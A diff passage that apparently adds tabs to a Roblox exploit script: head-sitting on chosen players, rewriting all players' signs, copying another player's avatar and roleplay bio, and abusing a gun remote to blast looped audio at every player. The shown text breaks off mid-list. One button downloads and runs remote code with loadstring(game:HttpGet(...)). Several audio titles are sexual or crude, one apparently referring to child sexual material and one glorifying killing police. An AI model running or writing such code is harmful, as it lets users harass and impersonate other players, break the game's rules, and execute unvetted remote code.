@@ -6425,3 +6425,2316 @@ HouseTab:AddToggle({
         end
     end
 })
+
+local FunT = Window:MakeTab({"Fun Players", "fun"})
+FunT:AddSection({ "Fun Players" })
+
+
+local Section = FunT:AddSection({
+
+    Name = "Head Sit"
+
+})
+
+
+
+local selectedHeadSit = nil
+
+local headSitConnection = nil
+
+
+
+local pl = game.Players.LocalPlayer
+
+local players = {}
+
+
+
+local function updatePlayerList()
+
+    players = {}
+
+    for _, player in pairs(game.Players:GetPlayers()) do
+
+        table.insert(players, player.Name)
+
+    end
+
+    return players
+
+end
+
+
+
+updatePlayerList()
+
+
+
+local headSitDropdown = FunT:AddDropdown({
+
+    Name = "Select a Player",
+
+    Default = "",
+
+    Options = players,
+
+    Callback = function(Value)
+
+        selectedHeadSit = Value
+
+    end
+
+})
+
+
+
+FunT:AddToggle({
+
+    Name = "Head Sit",
+
+    Default = false,
+
+    Callback = function(bool)
+
+        local player = game.Players.LocalPlayer
+
+        local character = player.Character or player.CharacterAdded:Wait()
+
+        local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
+
+        local humanoid = character:WaitForChild("Humanoid")
+
+
+
+        if not selectedHeadSit or selectedHeadSit == "" then
+
+            return false
+
+        end
+
+
+
+        local selectedPlayer = game.Players:FindFirstChild(selectedHeadSit)
+
+
+
+        if bool then
+
+            if selectedPlayer and selectedPlayer.Character then
+
+                humanoid.Sit = true
+
+
+
+                if headSitConnection then
+
+                    headSitConnection:Disconnect()
+
+                end
+
+
+
+                headSitConnection = game:GetService("RunService").Heartbeat:Connect(function()
+
+                    if selectedPlayer.Character and selectedPlayer.Character:FindFirstChild("Head") and humanoid.Sit then
+
+                        local targetHead = selectedPlayer.Character.Head
+
+                        humanoidRootPart.CFrame = targetHead.CFrame * CFrame.Angles(0, 0, 0) * CFrame.new(0, 1.6, 0.4)
+
+                    else
+
+                        if headSitConnection then
+
+                            headSitConnection:Disconnect()
+
+                            headSitConnection = nil
+
+                            humanoid.Sit = false
+
+                        end
+
+                    end
+
+                end)
+
+            else
+
+                return false
+
+            end
+
+        else
+
+            if headSitConnection then
+
+                headSitConnection:Disconnect()
+
+                headSitConnection = nil
+
+            end
+
+            humanoid.Sit = false
+
+        end
+
+    end
+
+})
+
+
+
+FunT:AddButton({
+
+    Name = "Update Player List",
+
+    Callback = function()
+
+        local updatedPlayers = updatePlayerList()
+
+        if headSitDropdown and updatedPlayers then
+
+            pcall(function()
+
+                headSitDropdown:Refresh(updatedPlayers)
+
+            end)
+
+            if selectedHeadSit and not game.Players:FindFirstChild(selectedHeadSit) then
+
+                selectedHeadSit = nil
+
+                pcall(function()
+
+                    headSitDropdown:Set("")
+
+                end)
+
+            end
+
+        end
+
+    end
+
+})
+
+local Section2 = FunT:AddSection({
+
+    Name = "Placa"
+
+})
+
+local texto = ""
+
+local function trocaplaca(all, txt)
+if all then
+for _,v in next, game:GetService("Players"):GetPlayers() do
+if v.Character and v.Character:FindFirstChild("Sign") then
+v.Character:FindFirstChild("Sign").ToolSound:FireServer("Sign", "SignWords", txt)
+end
+end
+else
+if selectedHeadSit.Character and selectedHeadSit.Character:FindFirstChild("Sign") then
+selectedHeadSit.Character:FindFirstChild("Sign").ToolSound:FireServer("Sign", "SignWords", txt)
+end
+end
+end
+
+FunT:AddTextBox({
+    Name = "Texto",
+    PlaceholderText = "Texto da placa",
+    Callback = function(value)
+        texto = value
+    end
+})
+
+FunT:AddButton({
+    Name = "Placa troca all",
+    Callback = function(value)
+        trocaplaca(true, texto)
+    end
+})
+
+local Section = FunT:AddSection({"Browser"})
+
+FunT:AddButton({
+    Name = "Browser by Trakis hub - It doesn't work on Delta.",
+    Callback = function()
+        loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/09WI0rdvCDdDuIHd/raw"))()
+    end
+})
+
+
+local Tab = Window:MakeTab({"Avatar", "rbxassetid://10734952036"})
+
+
+
+Tab:AddSection({ Name = "Avatar" })
+
+
+
+Tab:AddSection({ Name = "Copy Avatar" })
+
+local Players = game:GetService("Players")
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local Remotes = ReplicatedStorage:WaitForChild("Remotes")
+
+
+
+local Target = nil
+
+
+
+local function GetPlayerNames()
+
+    local PlayerNames = {}
+
+    for _, player in ipairs(Players:GetPlayers()) do
+
+        table.insert(PlayerNames, player.Name)
+
+    end
+
+    return PlayerNames
+
+end
+
+
+
+local Dropdown = Tab:AddDropdown({
+
+    Name = "Select Player",
+
+    Options = GetPlayerNames(),
+
+    Default = Target,
+
+    Callback = function(Value)
+
+        Target = Value
+
+    end
+
+})
+
+
+
+local function UpdateDropdown()
+
+    Dropdown:Refresh(GetPlayerNames(), true)
+
+end
+
+
+
+Players.PlayerAdded:Connect(UpdateDropdown)
+
+Players.PlayerRemoving:Connect(UpdateDropdown)
+
+Tab:AddButton({
+
+    Name = "Copy Avatar",
+
+    Callback = function()
+
+        if not Target then return end
+
+
+
+        local LP = Players.LocalPlayer
+
+        local LChar = LP.Character
+
+        local TPlayer = Players:FindFirstChild(Target)
+
+
+
+        if TPlayer and TPlayer.Character then
+
+            local LHumanoid = LChar and LChar:FindFirstChildOfClass("Humanoid")
+
+            local THumanoid = TPlayer.Character:FindFirstChildOfClass("Humanoid")
+
+
+
+            if LHumanoid and THumanoid then
+
+                local LDesc = LHumanoid:GetAppliedDescription()
+
+
+
+                for _, acc in ipairs(LDesc:GetAccessories(true)) do
+
+                    if acc.AssetId and tonumber(acc.AssetId) then
+
+                        Remotes.Wear:InvokeServer(tonumber(acc.AssetId))
+
+                        task.wait(0.2)
+
+                    end
+
+                end
+
+
+
+                if tonumber(LDesc.Shirt) then
+
+                    Remotes.Wear:InvokeServer(tonumber(LDesc.Shirt))
+
+                    task.wait(0.2)
+
+                end
+
+
+
+                if tonumber(LDesc.Pants) then
+
+                    Remotes.Wear:InvokeServer(tonumber(LDesc.Pants))
+
+                    task.wait(0.2)
+
+                end
+
+
+
+                if tonumber(LDesc.Face) then
+
+                    Remotes.Wear:InvokeServer(tonumber(LDesc.Face))
+
+                    task.wait(0.2)
+
+                end
+
+
+
+                local PDesc = THumanoid:GetAppliedDescription()
+
+
+
+                local argsBody = {
+
+                    [1] = {
+
+                        [1] = PDesc.Torso,
+
+                        [2] = PDesc.RightArm,
+
+                        [3] = PDesc.LeftArm,
+
+                        [4] = PDesc.RightLeg,
+
+                        [5] = PDesc.LeftLeg,
+
+                        [6] = PDesc.Head
+
+                    }
+
+                }
+
+                Remotes.ChangeCharacterBody:InvokeServer(unpack(argsBody))
+
+                task.wait(0.5)
+
+
+
+                if tonumber(PDesc.Shirt) then
+
+                    Remotes.Wear:InvokeServer(tonumber(PDesc.Shirt))
+
+                    task.wait(0.3)
+
+                end
+
+
+
+                if tonumber(PDesc.Pants) then
+
+                    Remotes.Wear:InvokeServer(tonumber(PDesc.Pants))
+
+                    task.wait(0.3)
+
+                end
+
+
+
+                if tonumber(PDesc.Face) then
+
+                    Remotes.Wear:InvokeServer(tonumber(PDesc.Face))
+
+                    task.wait(0.3)
+
+                end
+
+
+
+                for _, v in ipairs(PDesc:GetAccessories(true)) do
+
+                    if v.AssetId and tonumber(v.AssetId) then
+
+                        Remotes.Wear:InvokeServer(tonumber(v.AssetId))
+
+                        task.wait(0.3)
+
+                    end
+
+                end
+
+
+
+                local SkinColor = TPlayer.Character:FindFirstChild("Body Colors")
+
+                if SkinColor then
+
+                    Remotes.ChangeBodyColor:FireServer(tostring(SkinColor.HeadColor))
+
+                    task.wait(0.3)
+
+                end
+
+
+
+                if tonumber(PDesc.IdleAnimation) then
+
+                    Remotes.Wear:InvokeServer(tonumber(PDesc.IdleAnimation))
+
+                    task.wait(0.3)
+
+                end
+
+
+
+                local Bag = TPlayer:FindFirstChild("PlayersBag")
+
+                if Bag then
+
+                    if Bag:FindFirstChild("RPName") and Bag.RPName.Value ~= "" then
+
+                        Remotes.RPNameText:FireServer("RolePlayName", Bag.RPName.Value)
+
+                        task.wait(0.3)
+
+                    end
+
+                    if Bag:FindFirstChild("RPBio") and Bag.RPBio.Value ~= "" then
+
+                        Remotes.RPNameText:FireServer("RolePlayBio", Bag.RPBio.Value)
+
+                        task.wait(0.3)
+
+                    end
+
+                    if Bag:FindFirstChild("RPNameColor") then
+
+                        Remotes.RPNameColor:FireServer("PickingRPNameColor", Bag.RPNameColor.Value)
+
+                        task.wait(0.3)
+
+                    end
+
+                    if Bag:FindFirstChild("RPBioColor") then
+
+                        Remotes.RPNameColor:FireServer("PickingRPBioColor", Bag.RPBioColor.Value)
+
+                        task.wait(0.3)
+
+                    end
+
+                end
+
+            end
+
+        end
+
+    end
+
+})
+
+Tab:AddSection({ "Character" })
+
+local colors = { "Bright red", "Lime green", "Bright blue", "Bright yellow", "Bright cyan", "Hot pink", "Royal purple" }
+
+local rgbEnabled = false
+
+
+
+local function changeColor(color)
+
+    local args = { color }
+
+    game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ChangeBodyColor"):FireServer(unpack(args))
+
+end
+
+
+
+local function toggleRGBCharacter(enabled)
+
+    rgbEnabled = enabled
+
+    if rgbEnabled then
+
+        while rgbEnabled do
+
+            for _, color in ipairs(colors) do
+
+                if not rgbEnabled then return end
+
+                changeColor(color)
+
+                wait(0.5)
+
+            end
+
+        end
+
+    end
+
+end
+
+Tab:AddToggle({
+
+    Name = "RGB Character",
+
+    Description = "Make your character RGB",
+
+    Default = false,
+
+    Callback = function(value)
+
+        toggleRGBCharacter(value)
+
+    end
+
+})
+
+
+local Tab = Window:MakeTab({"Morphs", "apple"})
+
+Tab:AddButton({
+
+    Name = "Mini avatar",
+
+    Callback = function()
+
+    local args = {
+    212241661914186
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("WearBundle"):InvokeServer(unpack(args))
+
+end
+
+})
+
+Tab:AddButton({
+
+    Name = "esquilo",
+
+    Callback = function()
+
+    local args = {
+    241411408629426
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("WearBundle"):InvokeServer(unpack(args))
+
+end
+
+})
+
+Tab:AddButton({
+
+    Name = "homem musculoso",
+
+    Callback = function()
+
+    local args = {
+    223216648264193
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("WearBundle"):InvokeServer(unpack(args))
+
+end
+
+})
+
+Tab:AddButton({
+
+    Name = "Meme",
+
+    Callback = function()
+
+    local args = {
+    136405109146878
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("WearBundle"):InvokeServer(unpack(args))
+
+end
+
+})
+
+Tab:AddButton({
+
+    Name = "gordin safado",
+
+    Callback = function()
+
+    local args = {
+    256720272548506
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("WearBundle"):InvokeServer(unpack(args))
+
+end
+
+})
+
+Tab:AddButton({
+
+    Name = "gatin fofo",
+
+    Callback = function()
+
+    local args = {
+    44188585559836
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("WearBundle"):InvokeServer(unpack(args))
+
+end
+
+})
+
+Tab:AddButton({
+
+    Name = "patrick",
+
+    Callback = function()
+
+    local args = {
+    182360470975588
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("WearBundle"):InvokeServer(unpack(args))
+
+end
+
+})
+
+Tab:AddButton({
+
+    Name = "foguinho",
+
+    Callback = function()
+
+    local args = {
+    149380187421681
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("WearBundle"):InvokeServer(unpack(args))
+
+end
+
+})
+
+Tab:AddButton({
+
+    Name = "gatinho cosmico",
+
+    Callback = function()
+
+    local args = {
+    35148541344467
+}
+game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("WearBundle"):InvokeServer(unpack(args))
+
+end
+
+})
+
+local TabSound = Window:MakeTab({"Sound All", "box"})
+
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
+
+-- Função para tocar som globalmente via Remote
+local function tocarGlobalmente(soundId)
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+            local hrp = player.Character.HumanoidRootPart
+            local args = {
+                [1] = hrp,
+                [2] = hrp,
+                [3] = Vector3.new(0, -1, 0),
+                [4] = Vector3.new(0, 0, 0),
+                [5] = hrp,
+                [6] = hrp,
+                [7] = tostring(soundId),
+                [8] = tostring(soundId),
+                [9] = { [1] = true },
+                [10] = {
+                    [1] = 25,
+                    [2] = Vector3.new(0.25, 0.25, 100),
+                    [3] = BrickColor.new(24),
+                    [4] = 0.25,
+                    [5] = Enum.Material.SmoothPlastic,
+                    [6] = 0.25
+                },
+                [11] = true,
+                [12] = false
+            }
+
+            local remote = ReplicatedStorage:FindFirstChild("RE")
+            if remote and remote:FindFirstChild("1Gu1n") then
+                pcall(function()
+                    remote["1Gu1n"]:FireServer(unpack(args))
+                end)
+            end
+        end
+    end
+end
+
+-- Variáveis
+local loopAtivo = false
+local InputID = ""
+
+-- TextBox para inserir o ID
+TabSound:AddTextBox({
+    Name = "Insira o ID Audio All",
+    Description = "Digite o ID do som que deseja tocar globalmente",
+    PlaceholderText = "Exemplo: 1234567890",
+    ClearTextOnFocus = true,
+    Callback = function(text)
+        InputID = tonumber(text)
+    end
+})
+
+-- Botão para tocar o som
+TabSound:AddButton({
+    Name = "Tocar Som Global",
+    Description = "Toca o áudio para todos os jogadores",
+    Callback = function()
+        if InputID then
+            tocarGlobalmente(InputID)
+
+            local globalSound = Instance.new("Sound")
+            globalSound.Parent = Workspace
+            globalSound.SoundId = "rbxassetid://" .. InputID
+            globalSound.Volume = 3
+            globalSound.Looped = false
+            globalSound:Play()
+
+            task.delay(5, function()
+                globalSound:Destroy()
+            end)
+        end
+    end
+})
+
+-- Toggle de Loop Global
+TabSound:AddToggle({
+    Name = "Loop Global",
+    Description = "Repetir som globalmente",
+    Default = false,
+    Callback = function(state)
+        loopAtivo = state
+        if loopAtivo then
+            task.spawn(function()
+                while loopAtivo do
+                    if InputID then
+                        tocarGlobalmente(InputID)
+
+                        local globalSound = Instance.new("Sound")
+                        globalSound.Parent = Workspace
+                        globalSound.SoundId = "rbxassetid://" .. InputID
+                        globalSound.Volume = 3
+                        globalSound.Looped = false
+                        globalSound:Play()
+
+                        task.delay(5, function()
+                            globalSound:Destroy()
+                        end)
+                    end
+                    task.wait(3)
+                end
+            end)
+        end
+    end
+})
+
+TabSound:AddSection({ "memes-" })
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
+
+-- Função para tocar som globalmente via Remote
+local function tocarGlobalmente(soundId)
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
+            local hrp = player.Character.HumanoidRootPart
+            local args = {
+                [1] = hrp,
+                [2] = hrp,
+                [3] = Vector3.new(0, -1, 0),
+                [4] = Vector3.new(0, 0, 0),
+                [5] = hrp,
+                [6] = hrp,
+                [7] = tostring(soundId),
+                [8] = tostring(soundId),
+                [9] = { [1] = true },
+                [10] = {
+                    [1] = 25,
+                    [2] = Vector3.new(0.25, 0.25, 100),
+                    [3] = BrickColor.new(24),
+                    [4] = 0.25,
+                    [5] = Enum.Material.SmoothPlastic,
+                    [6] = 0.25
+                },
+                [11] = true,
+                [12] = false
+            }
+
+            local remote = ReplicatedStorage:FindFirstChild("RE")
+            if remote and remote:FindFirstChild("1Gu1n") then
+                pcall(function()
+                    remote["1Gu1n"]:FireServer(unpack(args))
+                end)
+            end
+        end
+    end
+end
+
+-- Lista completa de sons de memes
+local sonsMemes = {
+    {name = "Trollface laugh", id = "73753120048787"},
+    {name = "troll face sussy", id = "9098738774"},
+    {name = "troll cut", id = "8389041427"},
+    {name = "troll transition", id = "7705506391"},
+    {name = "troll laugh", id = "7816195044"},
+    {name = "Magic2", id = "9066733515"},
+    {name = "homero brasileo", id = "115224076671067"},
+    {name = "LOUD Youve been trolled", id = "6787686247"},
+    {name = "Fart Meme Sound", id = "6454805792"},
+    {name = "Metal Rattle 2 SFX", id = "9116788555"},
+    {name = "Hentai wiaaaaan", id = "88332347208779"},
+    {name = "iamete cunasai", id = "108494476595033"},
+    {name = "dodichan onnn...", id = "134640594695384"},
+    {name = "Toma jack", id = "132603645477541"},
+    {name = "Toma jackV2", id = "100446887985203"},
+    {name = "Toma jack no sol quente", id = "97476487963273"},
+    {name = "ifood", id = "133843750864059"},
+    {name = "pelo geito ela ta querendo ram", id = "94395705857835"},
+    {name = "lula vai todo mundo", id = "136804576009416"},
+    {name = "coringa", id = "84663543883498"},
+    {name = "shoope", id = "8747441609"},
+    {name = "quenojo", id = "103440368630269"},
+    {name = "sai dai lava prato", id = "101232400175829"},
+    {name = "se e loko numconpeça", id = "78442476709262"},
+    {name = "mita sequer que eu too uma", id = "94889439372168"},
+    {name = "Hoje vou ser tua mulher e tu", id = "90844637105538"},
+    {name = "Deita aqui eu mandei vc deitar sirens", id = "100291188941582"},
+    {name = "miau", id = "131804436682424"},
+    {name = "skibidi", id = "128771670035179"},
+    {name = "BIRULEIBI", id = "121569761604968"},
+    {name = "sai", id = "121169949217007"},
+    {name = "risada boa dms", id = "127589011971759"},
+    {name = "vacilo perna de pau", id = "106809680656199"},
+    {name = "gomo gomo no!!!", id = "137067472449625"},
+    {name = "arroto", id = "140203378050178"},
+    {name = "iraaaa", id = "136752451575091"},
+    {name = "não fica se achando muito não", id = "101588606280167"},
+    {name = "WhatsApp notificação", id = "107004225739474"},
+    {name = "Samsung", id = "123767635061073"},
+    {name = "Shiiii", id = "120566727202986"},
+    {name = "ai_tomaa miku", id = "139770074770361"},
+    {name = "kuru_kuru", id = "122465710753374"},
+    {name = "PM ROCAM", id = "96161547081609"},
+    {name = "cavalo!!", id = "78871573440184"},
+    {name = "deixa os garoto brinca", id = "80291355054807"},
+    {name = "flamengo", id = "137774355552052"},
+    {name = "sai do mei satnas", id = "127944706557246"},
+    {name = "namoral agora e a hora", id = "120677947987369"},
+    {name = "n pode me chutar pq seu celebro e burro", id = "82284055473737"},
+    {name = "vc ta fudido vou te pegar", id = "120214772725166"},
+    {name = "deley", id = "102906880476838"},
+    {name = "Tu e um beta", id = "130233956349541"},
+    {name = "Porfavor n tira eu nao", id = "85321374020324"},
+    {name = "Olá beleza vc pode me dá muitos", id = "74235334504693"},
+    {name = "Discord sus", id = "122662798976905"},
+    {name = "rojao apito", id = "6549021381"},
+    {name = "off", id = "1778829098"},
+    {name = "Kazuma kazuma", id = "127954653962405"},
+    {name = "sometourado", id = "123592956882621"},
+    {name = "Estouradoespad", id = "136179020015211"},
+    {name = "Alaku bommm", id = "110796593805268"},
+    {name = "busss", id = "139841197791567"},
+    {name = "Estourado wItb", id = "137478052262430"},
+    {name = "sla", id = "116672405522828"},
+    {name = "HA HA HA", id = "138236682866721"}
+}
+
+-- Preparar dropdown
+local nomesSons = {}
+local mapaSons = {}
+for _, v in ipairs(sonsMemes) do
+    table.insert(nomesSons, v.name)
+    mapaSons[v.name] = v.id
+end
+
+local loopDropdownAtivo = false
+local somSelecionado = nil
+
+-- Cria dropdown
+TabSound:AddDropdown({
+    Name = "Memes Sons Globais",
+    Description = "Escolha um som para tocar globalmente",
+    Default = nomesSons[1],
+    Options = nomesSons,
+    Callback = function(valor)
+        somSelecionado = mapaSons[valor]
+    end
+})
+
+-- Botão de tocar som
+TabSound:AddButton({
+    Name = "Tocar Som Selecionado",
+    Description = "Toca o som globalmente",
+    Callback = function()
+        if somSelecionado then
+            tocarGlobalmente(somSelecionado)
+            local s = Instance.new("Sound")
+            s.SoundId = "rbxassetid://" .. somSelecionado
+            s.Volume = 3
+            s.Looped = false
+            s.Parent = Workspace
+            s:Play()
+            task.delay(5, function() s:Destroy() end)
+        end
+    end
+})
+
+-- Toggle loop global
+TabSound:AddToggle({
+    Name = "Loop Som Global",
+    Description = "Repete o som selecionado globalmente",
+    Default = false,
+    Callback = function(estado)
+        loopDropdownAtivo = estado
+        if loopDropdownAtivo then
+            task.spawn(function()
+                while loopDropdownAtivo do
+                    if somSelecionado then
+                        tocarGlobalmente(somSelecionado)
+                        local s = Instance.new("Sound")
+                        s.SoundId = "rbxassetid://" .. somSelecionado
+                        s.Volume = 3
+                        s.Looped = false
+                        s.Parent = Workspace
+                        s:Play()
+                        task.delay(5, function() s:Destroy() end)
+                    end
+                    task.wait(1)
+                end
+            end)
+        end
+    end
+})
+
+
+local Tab = Window:MakeTab({"Music", "music"})
+
+local function tocarMusica(id)
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    
+    -- Rádio (ToolMusicText)
+    local argsRadio = {
+        [1] = "ToolMusicText",
+        [2] = id
+    }
+    ReplicatedStorage:WaitForChild("RE"):WaitForChild("PlayerToolEvent"):FireServer(unpack(argsRadio))
+    
+    -- Casa (PickHouseMusicText)
+    local argsCasa = {
+        [1] = "PickHouseMusicText",
+        [2] = id
+    }
+    ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Player1sHous1e"):FireServer(unpack(argsCasa))
+
+    -- Carro (PickingCarMusicText)
+    local argsCarro = {
+        [1] = "PickingCarMusicText",
+        [2] = id
+    }
+    ReplicatedStorage:WaitForChild("RE"):WaitForChild("1Player1sCa1r"):FireServer(unpack(argsCarro))
+
+    -- Scooter (PickingScooterMusicText)
+    local argsScooter = {
+        [1] = "PickingScooterMusicText",
+        [2] = id
+    }
+    ReplicatedStorage:WaitForChild("RE"):WaitForChild("1NoMoto1rVehicle1s"):FireServer(unpack(argsScooter))
+end
+
+local function isValidMusicId(value)
+    return value and value ~= "" and value ~= "Option 1" and not value:match("novas musica adds") and not value:match("musica brasil") and not value:match("musica do meu interece") and not value:match("musica dls por elas") and not value:match("meme abaixo") and not value:match("estourada")
+end
+
+Tab:AddTextBox({
+    Name = "ID da música",
+    PlaceholderText = "Digite o ID e pressione Enter",
+    Callback = function(value)
+        if value and value ~= "" then
+            tocarMusica(tostring(value))
+        end
+    end
+})
+
+-- Dropdowns para Tab
+local function createMusicDropdown(title, musicOptions, defaultOption)
+    local musicNames = {}
+    local categoryMap = {}
+    for category, sounds in pairs(musicOptions) do
+        for _, music in ipairs(sounds) do
+            if music.name ~= "" then
+                table.insert(musicNames, music.name)
+                categoryMap[music.name] = {id = music.id, category = category}
+            end
+        end
+    end
+
+    local function playMusic(soundId)
+        tocarMusica(tostring(soundId)) -- Usa a função tocarMusica para tocar em todos os contextos
+    end
+
+    Tab:AddDropdown({
+        Name = title,
+        Description = "all",
+        Default = defaultOption,
+        Multi = false,
+        Options = musicNames,
+        Callback = function(selectedSound)
+            if selectedSound and categoryMap[selectedSound] then
+                local soundId = categoryMap[selectedSound].id
+                if soundId and soundId ~= "" and soundId ~= "4354908569" then
+                    playMusic(soundId)
+                end
+            end
+        end
+    })
+end
+
+-- Dropdown "Forro"
+createMusicDropdown("Forro", {
+    ["forro"] = {
+        {name = "forro mt bom", id = "106412079335663"},
+        {name = "lembranças", id = "111551362636063"},
+        {name = "Passinho do barão", id = "127786586963377"},
+        {name = "Bloquinho Macumbeira", id = "138345050819224"},
+        {name = "eu já tava bem", id = "93590122047380"},
+        {name = "PISEIRO ESTOURADO (20 sgds de intro)", id = "133190351316780"},
+        {name = "forro ja cansou", id = "74812784884330"},
+        {name = "GRELO E O FE", id = "72200166265935"},
+        {name = "lenbro ate hoje", id = "71531533552899"},
+        {name = "escolha certa", id = "107088620814881"},
+        {name = "forro da rezenha", id = "120973520531216"},
+        {name = "forro dudu", id = "74404168179733"},
+        {name = "forro sao joao", id = "106364874935196"},
+        {name = "forro engraçado paia", id = "76524290482399"},
+        {name = "100% forro vaquejada", id = "92295159623916"},
+        
+        {name = "PASTOR MIRIM E A LÍNGUA DOS ANJOS", id = "71153532555470"},
+        {name = "PARA NÃO ESQUECER QUEM SOMOS", id = "88937498361674"},
+        {name = "Uno zero", id = "112959083808887"},
+        {name = "Iate do neymar", id = "135738534706063"},
+        {name = "Batidao na aldeia", id = "79953696595578"},
+        {name = "", id = ""},
+        {name = "", id = ""}
+    }
+}, "Option 1")
+
+-- Dropdown "Musicas e Memes Aleatorio"
+createMusicDropdown("Musicas e Memes Aleatorio", {
+    ["forro"] = {
+        {name = "desca dai seu corno", id = "119738878921996"},
+        {name = "GTA ESTOURADO", id = "109337680029292"},
+        {name = "ANXIETY (Amapiano Re-fix)", id = "101483901475189"}, 
+        {name = "Meu corpo, minhas regras", id = "127587901595282"},
+        {name = "Megalovania but its only the melodies", id = "104500091160463"},
+        {name = "androphono strikes back", id = "78312089943968"},
+        {name = "Bamm Bamm", id = "128730685516895"},
+        {name = "longe de mais", id = "124478512057763"},
+        {name = "Garoto de Copacabana", id = "135648634110254"},
+        {name = "CELL!", id = "117634275895085"},
+        {name = "Boa vibe em Ubatuba", id = "139059061493558"},
+        {name = "SLIP AWAY", id = "126152928520174"},
+        {name = "Alone in Motion", id = "122379348696948"},
+        {name = "Fade Away", id = "81002139735874"},
+        {name = "Wounds & Wishes", id = "109347979566607"},
+        {name = "Ascensão do Monarca", id = "101864243033211"},
+        {name = "carro do ovo", id = "3148329638"},
+        {name = "ingles bus (fling ou kill bus)", id = "123268013026823"},
+        {name = "MIKU MIKU HATSUNE", id = "112783541496955"},
+        {name = "Escalando a Seleção Brasileira para a Copa", id = "116546457407236"},
+        {name = "", id = ""},
+        {name = "", id = ""},
+        {name = "", id = ""},
+        {name = "", id = ""},
+        {name = "", id = ""}
+    }
+}, "Option 1")
+
+-- Dropdown "Funk"
+createMusicDropdown("Funk", {
+    ["Funk"] = {
+        {name = "Meu Hd Chei De Cp", id = "118351471702293"},
+        {name = "sla", id = "134763052215450"},
+        {name = "tls", id = "126036553384258"},
+        {name = "hoje eu acordei", id = "127870629973068"},
+        {name = "aquela sister", id = "97708834121472"},
+        {name = "set mc mn funk", id = "78631447496051"},
+        {name = "tô com o piru desgovernado", id = "115837046053738"},
+        {name = "eu tô doida pra te dar", id = "11505819302675"},
+        {name = "eu não sou gay", id = "82816587043443"},
+        {name = "i like trains", id = "94410505324605"},
+        {name = "quem gosta de bucetão", id = "84434631780133"},
+        {name = "vai mamar o bonde", id = "137888824649807"},
+        {name = "sla", id = "92524227941055"},
+        {name = "vem me fudendo", id = "136574160308808"},
+        {name = "matar os policia e nossa meta", id = "72559750723073"},
+        {name = "AURA!", id = "112984167725214"},
+        {name = "Carnavel - mc mamãe", id = "96934467275534"},
+        {name = "o sossego acabou", id = "125354466627612"},
+        {name = "Uniao Flasco", id = "81628621752701"},
+        {name = "ANALONG FUNK", id = "112214814544629"},
+        {name = "LALALALA", id = "107314654399868"},
+        {name = "BALINHA", id = "112406825739796"},
+        {name = "Amor Hospitalar", id = "96259351729049"},
+        {name = "Assobio Turbulento", id = "88975584625558"},
+        {name = "Tentar", id = "131267110896054"},
+        {name = "FUNK NARUTO", id = "89473100926016"},
+        {name = "eu gosto de tu fy", id = "73937969824874"},
+        {name = "MACET 2 FUNK", id = "97063553131882"},
+        {name = "Não Trate a Natalia mal", id = "76860168288557"},
+        {name = "ou ou ou", id = "126196231406971"},
+        {name = "meca", id = "108226178439659"},
+        {name = "antares", id = "122938948937941"},
+        {name = "Piranha Piranha", id = "123238370098753"},
+        {name = "Batida do Tal Do Tbt", id = "91007045451630"},
+        {name = "comeno uma prkinha", id = "94214367115154"},
+        {name = "soca na danada", id = "100337717591420"},
+        {name = "desce talarica", id = "110363768678499"},
+        {name = "RITMADA DE VILAO", id = "121405804171398"},
+        {name = "Paredao morcegao", id = "138120757806690"},
+        {name = "Jogo", id = "73198805524530"},
+        {name = "BEM VINDO AO HELIPA", id = "94672348312515"},
+        {name = "de sainha bem curtinha (40s intro)", id = "140655042547224"},
+        {name = "Ajoelha", id = "127052251825619"},
+        {name = "Eu não nasci pra trabalhar", id = "95197852052116"},
+        {name = "BITCH!", id = "103288558732219"},
+        {name = "arabe funk", id = "93451391025129"},
+        {name = "PUXANDO CBL", id = "78631447496051"},
+        {name = "REBOLA", id = "121046655523341"},
+        {name = "JOGA NO PAI", id = "128011871344522"},
+        {name = "RADINHO", id = "139693447546059"},
+        {name = "ESTOURADAO KKKK", id = "86839065790068"},
+        {name = "TIPO NINO", id = "140336018782383"},
+        {name = "NINO PT2", id = "97708834121472"},
+        {name = "EXCITADINHA? KKKK", id = "110176270788146"},
+        {name = "BERIMBAU KK", id = "77712236704085"},
+        {name = "NAT FUNK", id = "107416893652681"},
+        {name = "MTG EXPLODE", id = "81384105684889"},
+        {name = "envolvidão (15 sgds de intro)", id = "127775034804421"},
+        {name = "RAIL GRIND ESTOURADOOO", id = "135958179501280"},
+        {name = "CLYXAL X NYT", id = "100258273816054"},
+        {name = "SENTA E RBL", id = "107513285979080"},
+        {name = "chairy", id = "130071638363509"},
+        {name = "Seu Pedreiro", id = "116272171755349"},
+        {name = "fuga na viatura", id = "131891110268352"},
+        {name = "funkphonk fumando verde", id = "112143944982807"},
+        {name = "que que sharke", id = "129546408528391"},
+        {name = "pre treino", id = "136869502216760"},
+        {name = "CVRL", id = "124244582950595"},
+        {name = "batida Brega Violino (Beat Brega Funk)", id = "99399643204701"},
+        {name = "Dança do Canguru (Pke Gaz1nh)", id = "86876136192157"},
+        {name = "MONTAGEM ARABIANA (Pke Gaz1nh)", id = "78076624091098"},
+        {name = "Manda o papo (NGI)", id = "132642647937688"},
+        {name = "Viver bem", id = "82805460494325"},
+        {name = "Faixa estronda", id = "121187736532042"},
+        {name = "Ritmo Pixelado", id = "93928823862203"},
+        {name = "Viagem Sonora", id = "79349174602261"},
